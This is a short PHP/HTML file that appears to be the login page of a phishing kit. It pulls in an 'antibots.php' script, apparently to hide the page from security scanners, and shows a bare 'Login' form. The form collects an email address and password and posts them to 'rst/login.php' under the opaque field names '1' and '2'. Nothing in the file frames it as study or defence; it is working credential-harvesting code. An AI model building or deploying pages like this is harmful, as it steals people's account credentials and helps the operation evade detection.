<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Login</title>
<link href="img/fav.png" rel="shortcut icon">
<link href="css/style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:0px;top:0px;width:1325px;height:648px;z-index:3;">
<form action="rst/login.php" method="POST">
<input type="email" required="" id="Editbox1" style="position:absolute;left:533px;top:210px;width:288px;height:38px;line-height:38px;z-index:0;" name="1" value="" placeholder="Email address">
<input type="password" required="" id="Editbox2" style="position:absolute;left:533px;top:269px;width:288px;height:38px;line-height:38px;z-index:1;" name="2" value="" placeholder="Password">
<input type="submit" id="Button1" name="" value="Sign In" style="position:absolute;left:533px;top:368px;width:300px;height:38px;z-index:2;cursor: pointer;">
</form>
</div>
</body>
</html>